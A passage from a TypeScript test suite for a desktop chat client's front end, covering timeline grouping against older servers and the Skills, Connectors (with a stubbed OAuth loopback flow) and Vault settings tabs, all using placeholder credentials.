      M().handleFrame({ type: 'tool-call', turnId: 'B', toolCallId: 'b', name: 'Bash', input: {} })

      // TWO separate timelines — the user turn breaks the run.
      const tls = Array.from(chat.querySelectorAll('.timeline')) as HTMLElement[]
      expect(tls.length).toBe(2)
      expect(tls[0].classList.contains('collapsed')).toBe(true)  // first settled
      expect(tls[1].classList.contains('collapsed')).toBe(false) // second in flight
    })

    // ── Version-skew: grouping is gated on the server's `turn-complete` capability ──
    // A NEW moon against an OLD server (no turn-complete) must NOT group and must
    // settle each timeline on its own `assistant-done` — otherwise the grouped
    // timeline, which only settles on turn-complete, would hang on "Working on it…".

    it('timeline: hello capability turnComplete drives State.serverSupportsTurnComplete', () => {
      // New server advertises it.
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false, turnComplete: true } })
      expect(M().State.serverSupportsTurnComplete).toBe(true)
      // Old server omits it → falsy.
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false } })
      expect(M().State.serverSupportsTurnComplete).toBe(false)
    })

    it('timeline (old server, no turn-complete): per-turn timelines settle on assistant-done — no hang', () => {
      // Server advertises NO turn-complete capability.
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false } })
      expect(M().State.serverSupportsTurnComplete).toBe(false)

      // Two tool-using assistant turns, distinct turnIds. NO turn-complete is
      // ever sent (the old server can't emit it).
      M().handleFrame({ type: 'assistant-delta', turnId: 'A', text: 'one ' })
      M().handleFrame({ type: 'tool-call', turnId: 'A', toolCallId: 'a', name: 'Read', input: {} })
      M().handleFrame({ type: 'assistant-done', turnId: 'A', message: { text: 'one' } })
      M().handleFrame({ type: 'tool-result', toolCallId: 'a', status: 'ok', output: 'r' })
      M().handleFrame({ type: 'assistant-delta', turnId: 'B', text: 'two ' })
      M().handleFrame({ type: 'tool-call', turnId: 'B', toolCallId: 'b', name: 'Bash', input: {} })
      M().handleFrame({ type: 'assistant-done', turnId: 'B', message: { text: 'two' } })

      // NOT grouped → two separate timelines (the pre-grouping behavior), and
      // BOTH settle (collapse) on their own done despite no turn-complete — so
      // the UI never hangs on a perpetual "Working on it…" spinner.
      const tls = Array.from(chat.querySelectorAll('.timeline')) as HTMLElement[]
      expect(tls.length).toBe(2)
      expect(tls.every((t) => t.classList.contains('collapsed'))).toBe(true)
      expect(chat.querySelector('.timeline .typing-dots')).toBeNull()
      expect(chat.querySelector('.timeline-summary-label')!.textContent).toContain('Worked for')
    })
  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Skills settings tab (PRD Part B §12, Moon-side wiring)
  //
  // Driven at the production seam (__MoonInternals.handleFrame): hello
  // reveals/hides the tab via capabilities.skills; skill-catalog renders the
  // watercolor rows; clicking a row sends skill-toggle and goes pending (no
  // optimistic flip); skill-status ok settles it, ok:false surfaces the error.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Skills settings tab', () => {
    const M = () => (window as any).__MoonInternals

    const catalog = () => ({
      type: 'skill-catalog',
      skills: [
        { id: 'clear-writing', name: 'Clear Writing', description: 'Strunk rules.',
          whenToUse: 'Writing prose.', category: 'writing', tags: ['style'], source: 'builtin', enabled: true },
        { id: 'duck-query', name: 'Duck Query', description: 'SQL over files.',
          whenToUse: 'Data questions.', category: 'data', tags: ['sql'], source: 'user', enabled: false },
      ],
    })

    const sentFrames: any[] = []
    beforeEach(() => {
      sentFrames.length = 0
      const m = M()
      // capture outbound frames at the engine seam (no real socket in jsdom)
      m.WebSocketEngine.send = (f: any) => { sentFrames.push(f) }
      ;(window as any).State = m.State
      m.State.skills = []
      m.State.skillsPending = {}
      // pretend the socket is open so toggle() passes its connection guard
      m.State.ws = { readyState: WebSocket.OPEN }
      const err = document.getElementById('skills-error')
      if (err) { err.hidden = true; err.textContent = '' }
    })

    it('hello capabilities.skills reveals the tab; an old server hides it again', () => {
      const tab = document.getElementById('skills-tab-btn')!
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false, skills: true } })
      expect(M().State.serverSupportsSkills).toBe(true)
      expect(tab.hidden).toBe(false)
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false } })
      expect(M().State.serverSupportsSkills).toBe(false)
      expect(tab.hidden).toBe(true)
    })

    it('skill-catalog renders one watercolor row per skill, off-rows dimmed', () => {
      M().handleFrame(catalog())
      const rows = document.querySelectorAll('#skills-list .skill-row')
      expect(rows.length).toBe(2)
      expect(rows[0]!.classList.contains('off')).toBe(false)
      expect(rows[1]!.classList.contains('off')).toBe(true)
      expect(rows[0]!.querySelector('.skill-blot')).not.toBeNull()
      expect(rows[0]!.textContent).toContain('Clear Writing')
      expect(rows[1]!.textContent).toContain('yours') // source=user badge
      expect(document.getElementById('skills-count')!.textContent).toContain('1/2')
    })

    it('clicking a row sends skill-toggle and marks pending WITHOUT flipping', () => {
      M().handleFrame(catalog())
      const row = document.querySelectorAll('#skills-list .skill-row')[0] as HTMLElement
      row.click()
      expect(sentFrames).toEqual([{ type: 'skill-toggle', id: 'clear-writing', enabled: false }])
      const rerendered = document.querySelectorAll('#skills-list .skill-row')[0]!
      expect(rerendered.classList.contains('pending')).toBe(true)
      expect(rerendered.classList.contains('off')).toBe(false) // not flipped yet
      // a second click while pending is a no-op
      ;(rerendered as HTMLElement).click()
      expect(sentFrames.length).toBe(1)
    })

    it('skill-status ok settles the row; ok:false surfaces the message and reverts nothing', () => {
      M().handleFrame(catalog())
      ;(document.querySelectorAll('#skills-list .skill-row')[0] as HTMLElement).click()
      M().handleFrame({ type: 'skill-status', id: 'clear-writing', enabled: false, ok: true })
      const row = document.querySelectorAll('#skills-list .skill-row')[0]!
      expect(row.classList.contains('pending')).toBe(false)
      expect(row.classList.contains('off')).toBe(true)

      M().handleFrame({ type: 'skill-status', id: 'duck-query', enabled: true, ok: false, message: 'nope' })
      const err = document.getElementById('skills-error')!
      expect(err.hidden).toBe(false)
      expect(err.textContent).toBe('nope')
      // duck-query stays off — no phantom enable
      expect(document.querySelectorAll('#skills-list .skill-row')[1]!.classList.contains('off')).toBe(true)
    })

    it('search + chips filter the list client-side', () => {
      M().handleFrame(catalog())
      const search = document.getElementById('skills-search-input') as HTMLInputElement
      search.value = 'sql'
      search.dispatchEvent(new Event('input'))
      let rows = document.querySelectorAll('#skills-list .skill-row')
      expect(rows.length).toBe(1)
      expect(rows[0]!.textContent).toContain('Duck Query')
      // reset search, filter by category chip "writing"
      search.value = ''
      search.dispatchEvent(new Event('input'))
      const chips = Array.from(document.querySelectorAll('#skills-chips .skills-chip'))
      const writing = chips.find((c) => c.textContent === 'writing') as HTMLElement
      writing.click()
      rows = document.querySelectorAll('#skills-list .skill-row')
      expect(rows.length).toBe(1)
      expect(rows[0]!.textContent).toContain('Clear Writing')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Connectors settings tab (PRD Part A §17, Moon-side wiring)
  //
  // Driven at the production seam (__MoonInternals.handleFrame), with the
  // Tauri bridge stubbed: connect → consent sheet → Authorize walks the
  // full client-brokered OAuth arc (loopback start → oauth-begin frame →
  // redirect → open browser + wait → oauth-code frame). Tokens never
  // appear anywhere in this file by construction.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Connectors settings tab', () => {
    const M = () => (window as any).__MoonInternals
    // Fake timers are active (line 59) → setTimeout never fires; the OAuth
    // arc is pure microtasks (awaited Tauri invoke promises), so flush those.
    const flush = async () => { for (let i = 0; i < 12; i++) await Promise.resolve() }

    const catalogFrame = () => ({
      type: 'connector-catalog',
      connectors: [
        {
          id: 'google-workspace', name: 'Google Workspace', blurb: 'Mail & files.',
          category: 'productivity', authKind: 'oauth2',
          capabilities: [
            { id: 'gmail-read', label: 'Read email', scopes: ['g.read'], defaultGranted: true },
            { id: 'gmail-send', label: 'Send email', scopes: ['g.send'], defaultGranted: false },
          ],
        },
        {
          id: 'slack', name: 'Slack', blurb: 'Channels & DMs.',
          category: 'communication', authKind: 'api-key',
          capabilities: [
            { id: 'read', label: 'Read', scopes: [], defaultGranted: true },
          ],
        },
      ],
    })

    const sentFrames: any[] = []
    const invokeCalls: Array<{ cmd: string; args: any }> = []
    let invokeImpl: (cmd: string, args?: any) => Promise<any>

    beforeEach(() => {
      sentFrames.length = 0
      invokeCalls.length = 0
      const m = M()
      m.WebSocketEngine.send = (f: any) => { sentFrames.push(f) }
      m.State.ws = { readyState: WebSocket.OPEN }
      m.State.connectorCatalog = []
      m.State.connectorInstances = []
      m.State.connectorBusy = {}
      m.ConnectorsEngine._consentOpen = null
      m.ConnectorsEngine._oauthRequestId = null
      m.ConnectorsEngine._oauthDefinitionId = null
      m.ConnectorsEngine._plainRequests = {}
      m.ConnectorsEngine._consentDraft = {}
      m.ConnectorsEngine._reconnectLabel = null
      invokeImpl = async (cmd: string) => {
        if (cmd === 'oauth_loopback_start') return 49152
        if (cmd === 'oauth_loopback_wait') return { code: 'captured-code', state: 'captured-state' }
        return undefined
      }
      ;(window as any).__TAURI__ = {
        core: {
          invoke: (cmd: string, args?: any) => {
            invokeCalls.push({ cmd, args })
            return invokeImpl(cmd, args)
          },
        },
      }
      const err = document.getElementById('connectors-error')
      if (err) { err.hidden = true; err.textContent = '' }
    })

    it('hello capabilities.connectors reveals the tab; catalog renders cards', () => {
      const tab = document.getElementById('connectors-tab-btn')!
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false, connectors: true } })
      expect(tab.hidden).toBe(false)
      M().handleFrame(catalogFrame())
      const cards = document.querySelectorAll('#connectors-list .connector-card')
      expect(cards.length).toBe(2)
      expect(cards[0]!.textContent).toContain('Google Workspace')
      expect(cards[0]!.querySelector('.skill-blot')).not.toBeNull() // watercolor status blot
      // old server hides the tab again
      M().handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true, localShell: false, setup: false } })
      expect(tab.hidden).toBe(true)
    })

    it('Connect opens the consent sheet with defaultGranted prechecked; Authorize walks the OAuth arc', async () => {
      M().handleFrame(catalogFrame())
      const googleCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      ;(googleCard.querySelector('.connector-btn') as HTMLElement).click()

      const sheet = document.querySelector('#connectors-list .connector-consent')!
      const boxes = Array.from(sheet.querySelectorAll('input[type=checkbox]')) as HTMLInputElement[]
      expect(boxes.map((b) => b.checked)).toEqual([true, false]) // gmail-read yes, gmail-send no
      expect(sheet.textContent).toContain('g.read') // scopes visible pre-consent

      ;(sheet.querySelector('.connector-btn') as HTMLElement).click() // Authorize
      await flush() // let the async arc start

      // loopback bound, then the begin frame with the bound port + narrowed caps
      expect(invokeCalls[0]?.cmd).toBe('oauth_loopback_start')
      const begin = sentFrames.find((f) => f.type === 'connector-oauth-begin')
      expect(begin).toMatchObject({
        definitionId: 'google-workspace',
        capabilityIds: ['gmail-read'],
        loopbackPort: 49152,
      })

      // server answers with the consent URL → browser hop + wait → code frame
      M().handleFrame({
        type: 'connector-oauth-redirect',
        requestId: begin.requestId,
        pendingId: 'pend-1',
        authUrl: 'https://accounts.fake.test/auth?x=1',
      })
      await flush()
      await flush()
      expect(invokeCalls.map((c) => c.cmd)).toContain('open_external_url')
      expect(invokeCalls.find((c) => c.cmd === 'open_external_url')?.args?.url)
        .toBe('https://accounts.fake.test/auth?x=1')
      const codeFrame = sentFrames.find((f) => f.type === 'connector-oauth-code')
      expect(codeFrame).toMatchObject({
        pendingId: 'pend-1',
        code: 'captured-code',
        state: 'captured-state',
      })

      // connector-list broadcast settles the card into Connected + Disconnect
      M().handleFrame({
        type: 'connector-list',
        instances: [{
          id: 'inst-1', definitionId: 'google-workspace', label: 'Google Workspace',
          status: 'connected', grantedScopes: ['g.read'], createdAt: 1, lastHealthyAt: 1,
        }],
      })
      const settled = document.querySelectorAll('#connectors-list .connector-card')[0]!
      expect(settled.textContent).toContain('Connected')
      expect(settled.textContent).toContain('Disconnect')
    })

    it('a failed consent hop cancels the loopback and surfaces the error', async () => {
      invokeImpl = async (cmd: string) => {
        if (cmd === 'oauth_loopback_start') return 49200
        if (cmd === 'oauth_loopback_wait') throw 'timed out waiting for the browser consent'
        return undefined
      }
      M().handleFrame(catalogFrame())
      const card = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      ;(card.querySelector('.connector-btn') as HTMLElement).click()
      ;(document.querySelector('#connectors-list .connector-consent .connector-btn') as HTMLElement).click()
      await flush()
      const begin = sentFrames.find((f) => f.type === 'connector-oauth-begin')
      M().handleFrame({ type: 'connector-oauth-redirect', requestId: begin.requestId, pendingId: 'p', authUrl: 'https://x.test/a' })
      await flush()
      await flush()
      expect(invokeCalls.map((c) => c.cmd)).toContain('oauth_loopback_cancel')
      const err = document.getElementById('connectors-error')!
      expect(err.hidden).toBe(false)
      expect(err.textContent).toContain('timed out')
      expect(sentFrames.find((f) => f.type === 'connector-oauth-code')).toBeUndefined()
    })

    it('api-key connect sends the secretRef POINTER; needs-reauth shows gold + Reconnect', () => {
      M().handleFrame(catalogFrame())
      const slackCard = document.querySelectorAll('#connectors-list .connector-card')[1] as HTMLElement
      ;(slackCard.querySelector('.connector-btn') as HTMLElement).click()
      const sheet = document.querySelector('#connectors-list .connector-consent')!
      // The consent sheet now has a label input first; use the secretref-specific class.
      const ref = sheet.querySelector('.connector-secretref-input') as HTMLInputElement
      ref.value = 'env:SLACK_MCP_XOXB_TOKEN'
      ;(sheet.querySelector('.connector-btn') as HTMLElement).click()
      const frame = sentFrames.find((f) => f.type === 'connector-connect')
      expect(frame).toMatchObject({
        definitionId: 'slack',
        secretRef: 'env:SLACK_MCP_XOXB_TOKEN',
        capabilityIds: ['read'],
      })
      expect(JSON.stringify(sentFrames)).not.toContain('xoxb-') // pointer, never a value

      M().handleFrame({
        type: 'connector-list',
        instances: [{
          id: 'inst-g', definitionId: 'google-workspace', label: 'G',
          status: 'needs-reauth', grantedScopes: [], createdAt: 1, lastHealthyAt: null,
        }],
      })
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0]!
      expect(gCard.classList.contains('needs-reauth')).toBe(true)
      expect(gCard.textContent).toContain('Reconnect')
    })

    it('clientSetup.configured=false renders setup form; no Authorize button visible', () => {
      // A catalog with a Google Workspace connector that needs its OAuth client
      // configured first — the normal Authorize path must be gated.
      M().handleFrame({
        type: 'connector-catalog',
        connectors: [
          {
            id: 'google_workspace',
            name: 'Google Workspace',
            blurb: 'Mail & files.',
            category: 'productivity',
            authKind: 'oauth2',
            clientSetup: { configured: false },
            capabilities: [
              { id: 'gmail-read', label: 'Read email', scopes: ['gmail.readonly'], defaultGranted: true },
            ],
          },
        ],
      })
      const card = document.querySelector('#connectors-list .connector-card') as HTMLElement
      expect(card).not.toBeNull()
      // Setup form present
      const setup = card.querySelector('.connector-client-setup')!
      expect(setup).not.toBeNull()
      // Client ID input present and a Save client button
      const clientIdInput = setup.querySelector('input[type=text]') as HTMLInputElement
      expect(clientIdInput).not.toBeNull()
      const secretInput = setup.querySelector('input[type=password]') as HTMLInputElement
      expect(secretInput).not.toBeNull()
      expect(setup.textContent).toContain('Save client')
      // Explainer references Google Cloud Console
      expect(setup.textContent).toContain('Google Cloud Console')
      // No Authorize button — blocked until client is configured
      const btns = Array.from(card.querySelectorAll('.connector-btn')).map((b) => b.textContent)
      expect(btns).not.toContain('Authorize in browser')
      // And no dead Connect button either (review M2.6) — the setup form is
      // the only actionable step while the client is missing.
      expect(btns).not.toContain('Connect')
      expect(btns).toContain('Save client')
    })

    it('Save clears the credential inputs immediately (no secrets lingering in the DOM)', () => {
      const m = M()
      m.State.ws = { readyState: WebSocket.OPEN }
      m.handleFrame({
        type: 'connector-catalog',
        connectors: [{
          id: 'google_workspace', name: 'Google Workspace', blurb: 'Mail.',
          category: 'productivity', authKind: 'oauth2',
          clientSetup: { configured: false }, capabilities: [],
        }],
      })
      const setup = document.querySelector('#connectors-list .connector-client-setup')!
      const idInput = setup.querySelector('input[type=text]') as HTMLInputElement
      const secInput = setup.querySelector('input[type=password]') as HTMLInputElement
      idInput.value = 'my-id'
      secInput.value = 'my-secret'
      const save = Array.from(setup.querySelectorAll('.connector-btn'))
        .find((b) => b.textContent === 'Save client') as HTMLButtonElement
      save.click()
      // The frame went out with the values…
      const frame = sentFrames.find((f: any) => f.type === 'connector-set-client')
      expect(frame).toMatchObject({ clientId: 'my-id', clientSecret: 'my-secret' })
      // …and the inputs were cleared at once (review M2.6).
      expect(idInput.value).toBe('')
      expect(secInput.value).toBe('')
    })

    it('configured=true shows the badge with an Edit toggle that reopens the setup form (recovery path)', () => {
      const m = M()
      m.handleFrame({
        type: 'connector-catalog',
        connectors: [{
          id: 'google_workspace', name: 'Google Workspace', blurb: 'Mail.',
          category: 'productivity', authKind: 'oauth2',
          clientSetup: { configured: true }, capabilities: [],
        }],
      })
      const card = document.querySelector('#connectors-list .connector-card') as HTMLElement
      expect(card.textContent).toContain('✓ OAuth client configured')
      // No form while closed…
      expect(card.querySelector('.connector-client-setup')).toBeNull()
      // …Edit opens it (so a wrong/half-written credential can be re-entered
      // without hand-editing ~/.luna/.env — review M2.6).
      const edit = Array.from(card.querySelectorAll('.connector-btn'))
        .find((b) => b.textContent === 'Edit') as HTMLButtonElement
      expect(edit).toBeDefined()
      edit.click()
      const reopened = document.querySelector('#connectors-list .connector-client-setup')
      expect(reopened).not.toBeNull()
    })

    it('setClient sends connector-set-client frame with definitionId + clientId; omits empty secret', () => {
      const m = M()
      // Ensure ws is OPEN (already done in beforeEach but re-assert for clarity)
      m.State.ws = { readyState: WebSocket.OPEN }
      m.ConnectorsEngine.setClient('google_workspace', 'abc.apps.googleusercontent.com', '')
      const frame = sentFrames.find((f: any) => f.type === 'connector-set-client')
      expect(frame).toMatchObject({
        type: 'connector-set-client',
        definitionId: 'google_workspace',
        clientId: 'abc.apps.googleusercontent.com',
      })
      // Empty secret must NOT be forwarded
      expect(frame).not.toHaveProperty('clientSecret')
      // requestId has the setclient_ prefix
      expect(frame.requestId).toMatch(/^setclient_/)
    })

    // ── C1: Multi-account tests ─────────────────────────────────────────────

    it('C1: connector-list with TWO instances of one definition renders two labeled rows each with Disconnect', () => {
      M().handleFrame(catalogFrame())
      M().handleFrame({
        type: 'connector-list',
        instances: [
          {
            id: 'inst-personal', definitionId: 'google-workspace', label: 'personal',
            status: 'connected', grantedScopes: ['g.read'], createdAt: 1, lastHealthyAt: 1,
          },
          {
            id: 'inst-flowstay', definitionId: 'google-workspace', label: 'flowstay',
            status: 'connected', grantedScopes: ['g.read', 'g.send'], createdAt: 2, lastHealthyAt: 2,
          },
        ],
      })
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      // Two instance rows rendered
      const rows = gCard.querySelectorAll('.connector-instance-row')
      expect(rows.length).toBe(2)
      // Labels appear in the rows
      const labels = Array.from(rows).map((r) => r.querySelector('.connector-instance-label')!.textContent)
      expect(labels).toContain('personal')
      expect(labels).toContain('flowstay')
      // Each row has a Disconnect button
      for (const row of Array.from(rows)) {
        const btns = Array.from(row.querySelectorAll('.connector-btn')).map((b) => b.textContent)
        expect(btns).toContain('Disconnect')
      }
    })

    it('C1: card button reads "Add account" when ≥1 instance exists and opens the consent sheet with a label input', () => {
      M().handleFrame(catalogFrame())
      M().handleFrame({
        type: 'connector-list',
        instances: [{
          id: 'inst-1', definitionId: 'google-workspace', label: 'personal',
          status: 'connected', grantedScopes: ['g.read'], createdAt: 1, lastHealthyAt: 1,
        }],
      })
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      // Head button should say "Add account" when an instance exists
      const headBtn = gCard.querySelector('.connector-head .connector-btn') as HTMLElement
      expect(headBtn.textContent).toBe('Add account')
      // Clicking it opens the consent sheet
      headBtn.click()
      const sheet = document.querySelector('#connectors-list .connector-consent')!
      expect(sheet).not.toBeNull()
      // Consent sheet contains the account label input
      const labelInput = sheet.querySelector('.connector-label-input') as HTMLInputElement
      expect(labelInput).not.toBeNull()
      // (#10) Add-account opens with an EMPTY value, not prefilled with the
      // existing account label — the operator is adding a NEW account.
      expect(labelInput.value).toBe('')
      // (#7/#10) Clicking Reconnect on a needs-reauth instance prefills the label.
      M().handleFrame({
        type: 'connector-list',
        instances: [{
          id: 'inst-1', definitionId: 'google-workspace', label: 'personal',
          status: 'needs-reauth', grantedScopes: [], createdAt: 1, lastHealthyAt: null,
        }],
      })
      const reconCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      const reconBtn = Array.from(reconCard.querySelectorAll('.connector-btn'))
        .find((b) => b.textContent === 'Reconnect') as HTMLElement
      expect(reconBtn).toBeDefined()
      reconBtn.click()
      const reconSheet = document.querySelector('#connectors-list .connector-consent')!
      expect(reconSheet).not.toBeNull()
      const reconLabelInput = reconSheet.querySelector('.connector-label-input') as HTMLInputElement
      expect(reconLabelInput.value).toBe('personal')
    })

    it('C1: filling the label input + clicking Authorize sends connector-oauth-begin with that label', async () => {
      M().handleFrame(catalogFrame())
      // Start with one existing instance so "Add account" is shown
      M().handleFrame({
        type: 'connector-list',
        instances: [{
          id: 'inst-1', definitionId: 'google-workspace', label: 'personal',
          status: 'connected', grantedScopes: ['g.read'], createdAt: 1, lastHealthyAt: 1,
        }],
      })
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      // Open the consent sheet via "Add account"
      ;(gCard.querySelector('.connector-head .connector-btn') as HTMLElement).click()
      const sheet = document.querySelector('#connectors-list .connector-consent')!
      // Type a label
      const labelInput = sheet.querySelector('.connector-label-input') as HTMLInputElement
      labelInput.value = 'flowstay'
      // Click Authorize
      ;(sheet.querySelector('.connector-btn') as HTMLElement).click()
      await flush()
      // loopback was started
      expect(invokeCalls[0]?.cmd).toBe('oauth_loopback_start')
      // connector-oauth-begin carries the typed label
      const begin = sentFrames.find((f: any) => f.type === 'connector-oauth-begin')
      expect(begin).toMatchObject({
        definitionId: 'google-workspace',
        label: 'flowstay',
        loopbackPort: 49152,
      })
    })

    // ── Review-finding regression tests ────────────────────────────────────

    it('#5: connector-status {ok:false, requestId} matching a sent connector-connect clears busy and shows error', () => {
      M().handleFrame(catalogFrame())
      const slackCard = document.querySelectorAll('#connectors-list .connector-card')[1] as HTMLElement
      ;(slackCard.querySelector('.connector-btn') as HTMLElement).click()
      const sheet = document.querySelector('#connectors-list .connector-consent')!
      const ref = sheet.querySelector('.connector-secretref-input') as HTMLInputElement
      ref.value = 'env:SLACK_TOKEN'
      ;(sheet.querySelector('.connector-btn') as HTMLElement).click()
      // Grab the requestId that was sent
      const frame = sentFrames.find((f: any) => f.type === 'connector-connect')
      expect(frame).toBeDefined()
      expect(M().State.connectorBusy['slack']).toBe('connecting')

      // Server rejects (e.g. duplicate-label): {ok:false, requestId, message}
      M().handleFrame({ type: 'connector-status', ok: false, requestId: frame.requestId, message: 'Duplicate label' })

      // Busy must be cleared
      expect(M().State.connectorBusy['slack']).toBeUndefined()
      // Error message shown
      const err = document.getElementById('connectors-error')!
      expect(err.hidden).toBe(false)
      expect(err.textContent).toContain('Duplicate label')
      // Card must no longer show "Connecting…"
      const updatedCard = document.querySelectorAll('#connectors-list .connector-card')[1] as HTMLElement
      expect(updatedCard.textContent).not.toContain('Connecting')
    })

    it('#6: an unrelated connector-list broadcast does NOT clear busy for a definition with an in-flight add-account attempt', () => {
      M().handleFrame(catalogFrame())
      // Open Add account for google-workspace and start authorizing
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      ;(gCard.querySelector('.connector-head .connector-btn') as HTMLElement).click()
      // Manually set busy for google-workspace (simulates in-flight oauth)
      M().State.connectorBusy['google-workspace'] = 'authorizing'

      // A connector-list broadcast for an unrelated instance arrives
      M().handleFrame({
        type: 'connector-list',
        instances: [{
          id: 'inst-slack', definitionId: 'slack', label: 'work',
          status: 'connected', grantedScopes: ['read'], createdAt: 1, lastHealthyAt: 1,
        }],
      })

      // google-workspace's in-flight busy must NOT have been cleared
      expect(M().State.connectorBusy['google-workspace']).toBe('authorizing')
    })

    it('#8: typing a label, then receiving a connector-list broadcast, preserves the typed label in the rebuilt sheet', () => {
      M().handleFrame(catalogFrame())
      // Open the consent sheet for google-workspace
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      ;(gCard.querySelector('.connector-head .connector-btn') as HTMLElement).click()
      const sheet = document.querySelector('#connectors-list .connector-consent')!
      const labelInput = sheet.querySelector('.connector-label-input') as HTMLInputElement
      // Type a label — fire the input event so the draft is saved
      labelInput.value = 'typed-label'
      labelInput.dispatchEvent(new Event('input'))

      // A connector-list broadcast arrives (re-render)
      M().handleFrame({ type: 'connector-list', instances: [] })

      // Sheet must still be open and label must be preserved
      const rebuiltSheet = document.querySelector('#connectors-list .connector-consent')!
      expect(rebuiltSheet).not.toBeNull()
      const rebuiltLabel = rebuiltSheet.querySelector('.connector-label-input') as HTMLInputElement
      expect(rebuiltLabel.value).toBe('typed-label')
    })

    it('#9: connector-status {ok:false} while oauth is in flight invokes oauth_loopback_cancel', async () => {
      M().handleFrame(catalogFrame())
      const gCard = document.querySelectorAll('#connectors-list .connector-card')[0] as HTMLElement
      ;(gCard.querySelector('.connector-head .connector-btn') as HTMLElement).click()
      ;(document.querySelector('#connectors-list .connector-consent .connector-btn') as HTMLElement).click()
      await flush()
      // OAuth arc is in flight
      const begin = sentFrames.find((f: any) => f.type === 'connector-oauth-begin')
      expect(begin).toBeDefined()
      expect(M().ConnectorsEngine._oauthRequestId).toBe(begin.requestId)

      // Server sends a failure status (without a plain requestId match)
      M().handleFrame({ type: 'connector-status', ok: false, message: 'Server error' })

      // Must have invoked oauth_loopback_cancel to tear down the Rust listener
      expect(invokeCalls.some((c) => c.cmd === 'oauth_loopback_cancel')).toBe(true)
      // Error shown
      const err = document.getElementById('connectors-error')!
      expect(err.hidden).toBe(false)
      expect(err.textContent).toContain('Server error')
      // Busy cleared
      expect(M().State.connectorBusy['google-workspace']).toBeUndefined()
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Vault settings tab (Luna Vault V1)
  //
  // The friendly credential registry inside the (renamed) Secrets tab. The
  // wire is METADATA + POINTERS down (`vault-list`), value UP exactly once
  // (`vault-put`). These suites drive the same seam production uses
  // (__MoonInternals.handleFrame) and pin the one-shot wipe discipline: the
  // typed value must never survive a send, a settings close, or a socket
  // close, and validation failures must never put a frame on the wire.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Vault settings tab (Luna Vault V1)', () => {
    const M = () => (window as any).__MoonInternals

    const sentFrames: any[] = []

    const helloVault = (vault: boolean) => ({
      type: 'hello', protocolVersion: 2, kinds: [],
      capabilities: {
        chat: true, streamingDeltas: true, localShell: false, setup: false,
        ...(vault ? { vault: true } : {}),
      },
    })

    const listFrame = () => ({
      type: 'vault-list',
      items: [
        {
          id: 'itm-1', name: 'Notion API Key', kind: 'env-secret',
          ref: 'env:NOTION_API_KEY', source: 'manual', description: null,
          createdAt: 1, updatedAt: 1, synced: true, shadowed: false,
        },
        {
          id: 'itm-2', name: 'Deploy Token', kind: 'op-token',
          ref: 'luna-op://primary', source: 'agent', description: 'For deploys',
          createdAt: 1, updatedAt: 2, synced: false, shadowed: true,
        },
      ],
    })

    const el = <T extends HTMLElement = HTMLElement>(id: string) =>
      document.getElementById(id) as T
    const input = (id: string) => el<HTMLInputElement>(id)
    const fire = (target: HTMLElement, type: string) =>
      target.dispatchEvent(new Event(type, { bubbles: true }))

    beforeEach(() => {
      sentFrames.length = 0
      const m = M()
      m.WebSocketEngine.send = (f: any) => { sentFrames.push(f) }
      m.State.ws = { readyState: WebSocket.OPEN }
      m.handleFrame(helloVault(true))
    })

    it('hello capabilities.vault gates the Vault UI; old servers keep the legacy op-token form', () => {
      const section = el('vault-section')
      const legacy = el('legacy-op-token-section')
      // The tab is renamed "Vault" but keeps data-tab="secrets" (minimal churn).
      const tab = document.querySelector('.settings-tab[data-tab="secrets"]')!
      expect(tab.textContent).toBe('Vault')

      // beforeEach hello advertised vault → new UI shown, legacy hidden.
      expect(section.hidden).toBe(false)
      expect(legacy.hidden).toBe(true)

      // Channel switch to an OLD server (no vault capability) → fallback:
      // legacy form back, vault UI hidden, stale registry state dropped.
      M().handleFrame(helloVault(false))
      expect(section.hidden).toBe(true)
      expect(legacy.hidden).toBe(false)
      expect(M().State.vaultItems).toEqual([])
      // Legacy form pieces are intact (byte-identical old-server behavior).
      expect(el('op-label-input')).not.toBeNull()
      expect(el('op-token-input')).not.toBeNull()
      expect(el('save-op-token-btn')).not.toBeNull()
    })

    it('applyVaultList is an idempotent rebuild with kind/synced/shadowed badges', () => {
      const m = M()
      m.handleFrame(listFrame())
      let rows = document.querySelectorAll('#vault-list .vault-row')
      expect(rows.length).toBe(2)

      // Re-delivery of the same frame (reconnect / post-mutation broadcast)
      // must not duplicate rows.
      m.handleFrame(listFrame())
      rows = document.querySelectorAll('#vault-list .vault-row')
      expect(rows.length).toBe(2)

      // Row 1: name + kind badge + ref (small mono) + source + synced "1P" chip.
      const first = rows[0] as HTMLElement
      expect(first.textContent).toContain('Notion API Key')
      expect(first.querySelector('.skill-row-badge')!.textContent).toBe('API key')
      expect(first.querySelector('.vault-ref')!.textContent).toBe('env:NOTION_API_KEY')
      expect(first.querySelector('.vault-source')!.textContent).toBe('added by you')
      expect(first.querySelector('.vault-chip.synced')!.textContent).toBe('1P')
